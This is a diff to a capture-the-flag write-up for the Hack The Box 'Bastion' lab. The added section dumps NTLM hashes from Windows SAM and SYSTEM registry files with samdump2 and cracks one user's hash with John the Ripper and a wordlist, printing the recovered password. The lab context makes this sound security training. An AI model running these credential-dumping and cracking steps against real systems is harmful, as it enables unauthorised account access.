@@ -1,4 +1,4 @@
-# Box: Bastion
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a9d2afe2-2cae-4649-824e-39e27a303bae)# Box: Bastion
 # Level: Easy
 # OS: Windows
 <hr>
@@ -169,7 +169,7 @@ Now, we can access the mounted VHD
 
 Nice stuff hehe😎
 
-Going through the files on the disk I found a SAM (Security Accounts Manager) file and a registry hehe. These files are always stored in the ```C:\Windows\System32\config``` directory
+Going through the files on the disk I found a SAM (Security Accounts Manager) file and a registry hehe, this means we can dump some NTLM hashes😎. These files are always stored in the ```C:\Windows\System32\config``` directory
 
 Lets Navigate there
 
@@ -179,8 +179,49 @@ We can try sending these files to a different directory
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a70dc35b-31c4-4df9-b362-4b2214865501)
 
+Nice
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdf489e3-6233-44a6-b403-2366329145fc)
 
+So, we can use this tool to dump the ntlm hash
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/60c2bafd-4bda-4e98-9347-4bb8e42d6531)
+
+To dump the NTLM hashes
+
+command:```samdump2 SYSTEM SAM```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ samdump2 SYSTEM SAM 
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+```
+We got the NTLM hash for user ```L4mpje```. We can crack this using john
+
+command:```john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=NT```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ nano hash.txt                                 
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ cat hash.txt                                                 
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/bastion]
+└─$ john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=NT  
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bureaulampje     (L4mpje)     
+1g 0:00:00:01 DONE (2023-09-17 14:51) 0.6329g/s 5946Kp/s 5946Kc/s 5946KC/s burg772v..burdy1
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+```
+We  were able to get the password for user ```L4mpje``` with the help of my bro John😂
 
 
 
